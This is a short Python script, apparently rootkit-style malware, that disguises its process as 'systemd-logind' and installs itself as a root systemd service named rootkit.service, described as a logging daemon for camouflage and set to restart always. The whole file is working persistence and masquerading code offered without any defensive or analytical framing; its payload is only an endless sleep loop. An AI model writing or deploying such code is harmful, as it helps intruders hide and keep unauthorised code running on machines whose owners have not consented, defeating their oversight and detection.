import os
import sys
import time
import setproctitle

def disguise_process():
    """Change process name to common system process"""
    setproctitle.setproctitle("systemd-logind")

def install_service():
    """Create systemd service for persistence"""
    if os.geteuid() != 0:
        sys.exit(1)
        
    service_content = f'''[Unit]
Description=System Logging Daemon (camouflage)
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
'''
    
    service_path = "/etc/systemd/system/rootkit.service"
    with open(service_path, "w") as f:
        f.write(service_content)
    
    os.system("systemctl daemon-reload")
    os.system("systemctl enable rootkit.service")
    os.system("systemctl start rootkit.service")

if __name__ == "__main__":
    if not os.path.exists("/etc/systemd/system/rootkit.service"):
        install_service()
    
    disguise_process()
    while True:
        time.sleep(3600)  # Maintain process existence